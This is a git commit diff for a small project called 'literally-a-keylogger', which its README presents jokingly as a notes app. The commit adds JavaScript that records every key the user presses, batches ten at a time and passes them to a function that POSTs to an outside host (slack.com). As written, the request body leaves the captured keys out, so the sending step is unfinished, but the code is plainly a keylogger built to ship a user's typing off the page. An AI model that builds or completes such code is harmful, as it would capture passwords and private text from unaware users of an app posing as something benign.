4be5aa0898ef00543a558f6bdce086203b311419
HenryWauzivuff <145900606+HEofOttoman@users.noreply.github.com>
2026-08-07 18:52:22 +1000

    added send server function

--- README.md
+++ README.md
@@ -1,3 +1,4 @@
 # literally-a-keylogger
 A notes app, type whatever! I will know. so maybe don't.
 
+
--- src/keylogger.js
+++ src/keylogger.js
@@ -2,9 +2,28 @@ let log = [];
 
 document.addEventListener('keydown', (event) => {
     
-    
-    log.push(event.key)
+    log.push(event.key);
 
-    console.log(log);
+    if (log.length >= 10) {
+        console.log(log);
+        goPalantir(log);
+        log = [];
+    }
 });
 
+function goPalantir(load) {
+    try {
+        fetch('https://slack.com', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                channel: '',
+                text: '',
+            })
+        })
+    } catch (error) {
+        console.log('failed to palantir 💔');
+    };
+};
